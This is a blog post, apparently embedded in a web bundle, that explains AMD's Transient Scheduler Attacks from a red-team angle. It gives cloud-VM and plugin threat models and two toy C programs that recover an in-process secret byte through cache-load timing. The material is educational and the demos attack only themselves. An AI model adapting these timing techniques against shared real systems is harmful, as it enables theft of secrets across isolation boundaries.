</html>`,Qg=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
